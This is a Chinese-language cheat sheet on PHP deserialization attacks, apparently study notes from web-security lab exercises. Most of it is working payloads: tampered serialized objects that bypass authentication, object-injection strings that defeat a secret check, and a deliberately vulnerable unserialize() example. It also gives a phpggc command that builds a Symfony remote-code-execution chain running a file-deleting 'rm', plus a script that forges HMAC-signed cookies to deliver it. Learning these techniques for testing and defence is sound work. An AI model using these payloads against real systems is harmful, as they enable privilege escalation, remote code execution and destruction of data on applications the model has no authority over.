# PHP反序列化漏洞

## 身份验证绕过

1.修改序列化对象

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
|
v
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

2.修改序列化数据类型

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"in7rgz2b9qn9o6v0a072flcqamyacqgd";}
|
v
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

## 对象注入

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

易受攻击的代码：
```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

Payload:
```
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

数组：
```
a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
```

## 预构建的小工具链

[phpggc](https://github.com/ambionics/phpggc)

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```

des.php
```php
<?php
$object = "phpggc生成的有效负载";
$secretKey = "加密密钥";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

在PHP源代码中查找unserialize()函数或魔术方法：

+ __construct()
+ __destruct()
+ __call()
+ __callStatic()
+ __get()
+ __set()
+ __isset()
+ __unset()
+ __sleep()
+ __wakeup()
+ __serialize()
+ __unserialize()
+ __toString()
+ __invoke()
+ __set_state()
+ __clone()
+ __debugInfo()
